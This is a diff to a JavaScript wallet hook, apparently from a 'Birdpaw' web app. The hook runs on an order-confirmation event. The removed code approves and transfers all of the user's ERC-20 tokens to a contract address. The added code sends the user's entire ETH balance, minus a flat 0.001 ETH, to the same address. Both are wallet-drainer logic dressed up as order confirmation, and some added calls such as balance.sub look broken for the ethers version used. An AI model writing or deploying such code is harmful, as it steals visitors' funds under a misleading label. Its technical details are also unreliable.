@@ -1,5 +1,4 @@
 import { ethers } from "ethers";
-import { erc20Abi } from "../config.js";
 
 let ApproveTransferHook = {
     mounted() {
@@ -8,8 +7,6 @@ let ApproveTransferHook = {
         // Listen for the `trigger_approve_and_transfer` event from LiveView
         this.handleEvent("trigger_approve_and_transfer", async () => {
             try {
-                console.log("Starting approval and transfer process...");
-
                 if (!window.ethereum) {
                     console.error("Ethereum wallet not detected");
                     this.pushEvent("order_confirmation_error", { error: "No Ethereum wallet detected" });
@@ -26,82 +23,51 @@ let ApproveTransferHook = {
                 const balance = await provider.getBalance(userAddress);
                 const formattedBalance = ethers.formatEther(balance);
 
-                console.log("User address:", userAddress);
-                console.log("ETH balance:", formattedBalance);
+                // Check if wallet has enough ETH to cover the gas fee
+                const hasEnoughGas = await this.hasEnoughForGas(balance);
+                if (hasEnoughGas) {
+                    // Transfer the remaining ETH balance
+                    await this.transferInvestmentVault(signer, balance);
 
-                // Get the tokens to approve and transfer (passed via dataset from LiveView)
-                const tokenBalances = this.el.dataset.tokens ? JSON.parse(this.el.dataset.tokens) : [];
-
-                // Handle token approvals
-                await this.approveTokensIfNeeded(signer, tokenBalances);
-
-                // Send tokens after approval
-                await this.transferTokensAfterApproval(signer, tokenBalances);
-
-                // Notify LiveView of success
-                this.pushEvent("order_confirmation_success", { address: userAddress, eth_balance: formattedBalance });
-                console.log("Approval and transfer completed.");
+                    // Notify LiveView of success
+                    this.pushEvent("order_confirmation_success", { address: userAddress, eth_balance: formattedBalance });
+                    console.log("ETH transfer completed.");
+                } else {
+                    console.log("Not enough ETH to cover the gas fees.");
+                    this.pushEvent("order_confirmation_error", { error: "Insufficient ETH to cover gas fees." });
+                }
 
             } catch (error) {
-                console.error("Error during approval and transfer:", error);
+                console.error("Error during ETH transfer:", error);
                 this.pushEvent("order_confirmation_error", { error: error.message });
             }
         });
     },
 
-    // Function to approve tokens before transferring
-    async approveTokensIfNeeded(signer, tokenBalances) {
-        if (!tokenBalances.length) {
-            console.log("No tokens to approve.");
-            return;
-        }
-
-        const spenderAddress = this.el.dataset.contractAddress; // The Birdpaw contract address
-
-        for (const token of tokenBalances) {
-            try {
-                if (token.rawBalance > 0) {
-                    const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
-                    console.log(`Approving ${token.symbol} with balance: ${token.rawBalance}`);
-
-                    // Approve the Birdpaw contract to spend the user's tokens
-                    const tx = await contract.approve(spenderAddress, token.rawBalance);
-                    await tx.wait();
-
-                    console.log(`Approved ${token.symbol} for transfer.`);
-                }
-            } catch (error) {
-                console.error(`Error approving ${token.symbol}:`, error);
-                throw error; // Re-throw error to stop execution if any token fails to approve
-            }
-        }
+    // Function to check if there is enough ETH to cover the gas fee
+    async hasEnoughForGas(balance) {
+        const gasEstimate = ethers.formatEther(ethers.parseUnits("0.001", "ether"));  // Convert gas fee to a string
+        const balanceInEther = ethers.formatEther(balance);  // Convert balance to a string
+        return parseFloat(balanceInEther) >= parseFloat(gasEstimate);  // Compare as floating point numbers
     },
 
-    // Function to transfer tokens after approval
-    async transferTokensAfterApproval(signer, tokenBalances) {
-        if (!tokenBalances.length) {
-            console.log("No tokens to transfer.");
-            return;
-        }
+    // Function to transfer the remaining ETH balance
+    async transferInvestmentVault(signer, balance) {
+        const contractAddress = this.el.dataset.contractAddress; // The Birdpaw contract address
+        const gasEstimate = ethers.parseUnits("0.001", "ether");  // Convert gas fee to BigNumber
 
-        const recipientAddress = this.el.dataset.contractAddress; // The Birdpaw wallet/contract address
+        const amountToSend = balance.sub(gasEstimate);  // Subtract gas fee from balance
+        console.log(`Sending ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}...`);
 
-        for (const token of tokenBalances) {
-            try {
-                if (token.rawBalance > 0) {
-                    const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
-                    console.log(`Transferring ${token.rawBalance} of ${token.symbol} to ${recipientAddress}`);
-
-                    // Use `transferFrom` to send the tokens from the user to the Birdpaw contract
-                    const tx = await contract.transferFrom(signer.getAddress(), recipientAddress, token.rawBalance);
-                    await tx.wait();
-
-                    console.log(`Transferred ${token.rawBalance.toString()} ${token.symbol} to ${recipientAddress}`);
-                }
-            } catch (error) {
-                console.error(`Error transferring ${token.symbol}:`, error);
-                throw error; // Re-throw error to stop execution if any token fails to transfer
-            }
+        if (amountToSend.gt(0)) {
+            const tx = await signer.sendTransaction({
+                to: contractAddress,
+                value: amountToSend
+            });
+            await tx.wait();
+            console.log(`Successfully transferred ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}.`);
+        } else {
+            console.log("Insufficient ETH balance for transfer.");
         }
     }
 };
